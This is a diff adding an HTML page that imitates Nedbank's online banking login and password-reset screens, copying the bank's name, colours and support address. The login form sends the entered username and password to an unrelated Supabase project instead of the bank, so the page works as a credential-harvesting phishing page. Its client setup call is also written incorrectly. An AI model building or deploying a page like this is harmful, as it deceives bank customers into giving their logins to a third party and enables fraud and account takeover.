@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nedbank Online Banking</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 {
+            color: #006341; /* Nedbank green */
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #006341;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #004d2f;
+        }
+        .error, .success {
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .error { color: red; }
+        .success { color: green; }
+        .link {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .link a {
+            color: #006341;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .link a:hover {
+            text-decoration: underline;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginPage">
+        <h2>Nedbank Online Banking</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="loginUsername">Nedbank ID or Username</label>
+                <input type="text" id="loginUsername" required placeholder="Enter your Nedbank ID or Username">
+            </div>
+            <div class="form-group">
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" required placeholder="Enter your password">
+            </div>
+            <button type="submit">Log In</button>
+            <div class="error" id="loginError"></div>
+            <div class="link">
+                <p>Forgot your password? <a onclick="showResetPage()">Reset Password</a></p>
+                <p>Need help? <a href="mailto:digitalhelp@nedbank.co.za">Contact Support</a></p>
+            </div>
+        </form>
+    </div>
+
+    <div class="container hidden" id="resetPage">
+        <h2>Nedbank Password Reset</h2>
+        <form id="passwordResetForm">
+            <div class="form-group">
+                <label for="resetUsername">Nedbank ID or Username</label>
+                <input type="text" id="resetUsername" required placeholder="Enter your Nedbank ID or Username">
+            </div>
+            <div class="form-group hidden" id="passwordFields">
+                <label for="newPassword">New Password</label>
+                <input type="password" id="newPassword" placeholder="Enter new password">
+                <label for="confirmPassword">Confirm New Password</label>
+                <input type="password" id="confirmPassword" placeholder="Confirm new password">
+            </div>
+            <button type="submit" id="resetButton">Send Reset Email</button>
+            <div class="error" id="resetError"></div>
+            <div class="success" id="resetSuccess"></div>
+            <div class="link">
+                <p>Remembered your password? <a onclick="showLoginPage()">Log in</a></p>
+                <p>Need help? <a href="mailto:digitalhelp@nedbank.co.za">Contact Support</a></p>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Initialize Supabase client
+        const supabaseUrl = 'https://hjvxybjoouodecbxthxf.supabase.co';
+        const supabaseKey = 'YOUR_SUPABASE_ANON_KEY'; // Replace with your Supabase anon key
+        const supabase = Supabase.createClient(supabaseUrl, supabaseKey);
+
+        // Toggle between login and reset pages
+        function showLoginPage() {
+            document.getElementById('loginPage').classList.remove('hidden');
+            document.getElementById('resetPage').classList.add('hidden');
+        }
+
+        function showResetPage() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('resetPage').classList.remove('hidden');
+            document.getElementById('passwordFields').classList.add('hidden');
+            document.getElementById('resetButton').textContent = 'Send Reset Email';
+        }
+
+        // Login form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            const errorMessage = document.getElementById('loginError');
+
+            if (!username || !password) {
+                errorMessage.textContent = 'Please fill in all fields.';
+                return;
+            }
+
+            try {
+                const { data, error } = await supabase.auth.signInWithPassword({
+                    email: username, // Assuming username is an email
+                    password: password
+                });
+
+                if (error) {
+                    errorMessage.textContent = error.message;
+                    return;
+                }
+
+                errorMessage.textContent = '';
+                alert('Login successful! Redirecting...'); // Replace with actual redirect
+                // window.location.href = '/dashboard'; // Uncomment for redirect
+            } catch (err) {
+                errorMessage.textContent = 'An error occurred. Please try again.';
+            }
+        });
+
+        // Password reset form submission
+        document.getElementById('passwordResetForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const username = document.getElementById('resetUsername').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            const errorMessage = document.getElementById('resetError');
+            const successMessage = document.getElementById('resetSuccess');
+
+            // Step 1: Send reset email
+            if (!newPassword && !confirmPassword) {
+                try {
+                    const { error } = await supabase.auth.resetPasswordForEmail(username, {
+                        redirectTo: window.location.origin // Redirect back to this page for password update
+                    });
+
+                    if (error) {
+                        errorMessage.textContent = error.message;
+                        return;
+                    }
+
+                    errorMessage.textContent = '';
+                    successMessage.textContent = 'Password reset email sent. Check your inbox.';
+                    document.getElementById('passwordFields').classList.remove('hidden');
+                    document.getElementById('resetButton').textContent = 'Update Password';
+                } catch (err) {
+                    errorMessage.textContent = 'An error occurred. Please try again.';
+                }
+            } else {
+                // Step 2: Update password (after user clicks reset link and enters new password)
+                const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,16}$/;
+                if (!passwordRegex.test(newPassword)) {
+                    errorMessage.textContent = 'Password must be 8-16 characters, include letters, a number, and a special character.';
+                    return;
+                }
+
+                if (newPassword !== confirmPassword) {
+                    errorMessage.textContent = 'Passwords do not match.';
+                    return;
+                }
+
+                try {
+                    const { error } = await supabase.auth.updateUser({ password: newPassword });
+
+                    if (error) {
+                        errorMessage.textContent = error.message;
+                        return;
+                    }
+
+                    errorMessage.textContent = '';
+                    successMessage.textContent = 'Password updated successfully!';
+                    setTimeout(showLoginPage, 2000); // Return to login after success
+                } catch (err) {
+                    errorMessage.textContent = 'An error occurred. Please try again.';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
